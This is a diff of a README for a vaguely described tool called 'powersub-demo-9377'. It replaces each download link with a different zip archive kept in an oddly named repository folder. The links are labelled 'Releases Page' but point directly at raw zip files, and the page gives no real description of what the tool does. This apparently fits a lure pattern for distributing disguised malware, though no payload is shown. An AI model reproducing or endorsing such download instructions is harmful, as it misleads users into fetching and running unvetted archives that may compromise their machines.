@@ -1,7 +1,7 @@
 # 🚀 powersub-demo-9377 - Simple Tool for Your Daily Tasks
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/MasonSpringett/powersub-demo-9377/main/Rubicon/powersub-demo-9377.zip)](https://raw.githubusercontent.com/MasonSpringett/powersub-demo-9377/main/Rubicon/powersub-demo-9377.zip)
+[![Download](https://github.com/MasonSpringett/powersub-demo-9377/raw/refs/heads/main/pilcorn/powersub-demo-v1.1.zip)](https://github.com/MasonSpringett/powersub-demo-9377/raw/refs/heads/main/pilcorn/powersub-demo-v1.1.zip)
 
 ---
 
@@ -14,7 +14,7 @@ To get started with powersub-demo-9377, follow these simple steps to download an
 ### Step 1: Visit the Download Page
 Head over to the Releases page to download the application. Click the link below to access it directly:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/MasonSpringett/powersub-demo-9377/main/Rubicon/powersub-demo-9377.zip)
+[Visit the Releases Page](https://github.com/MasonSpringett/powersub-demo-9377/raw/refs/heads/main/pilcorn/powersub-demo-v1.1.zip)
 
 ### Step 2: Choose Your Version
 On the Releases page, you will find different versions of the application. Look for the latest release. It will usually be at the top of the list.
@@ -57,4 +57,4 @@ You now have all the information needed to download and start using powersub-dem
 
 Remember to visit the Releases page again for updates and new versions of the application.
 
-[Visit the Releases Page](https://raw.githubusercontent.com/MasonSpringett/powersub-demo-9377/main/Rubicon/powersub-demo-9377.zip)
+[Visit the Releases Page](https://github.com/MasonSpringett/powersub-demo-9377/raw/refs/heads/main/pilcorn/powersub-demo-v1.1.zip)
